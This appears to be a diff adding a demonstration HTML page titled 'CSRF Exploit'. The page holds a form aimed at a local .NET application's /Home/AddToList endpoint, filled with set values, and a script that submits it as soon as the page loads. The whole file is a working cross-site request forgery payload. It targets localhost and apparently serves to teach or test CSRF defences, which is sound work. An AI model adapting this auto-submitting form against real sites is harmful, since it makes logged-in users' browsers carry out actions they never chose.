@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>CSRF Exploit</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='css/site.css'>
+    <script src='js/site.js'></script>
+</head>
+<body>
+    <h1>Hey Dotnet!</h1>
+    <input type="button" value="Hacked!">
+    <form action="https://localhost:6001/Home/AddToList" 
+          method="post"
+          id="form-csrf">
+        <input name="Name" value="Mr. Robot">
+        <input name="Chapters" value="45">
+        <input name="Score" value="8.5">
+    </form>
+    <script>
+        document.getElementById('form-csrf').submit();
+    </script>
+</body>
+</html>
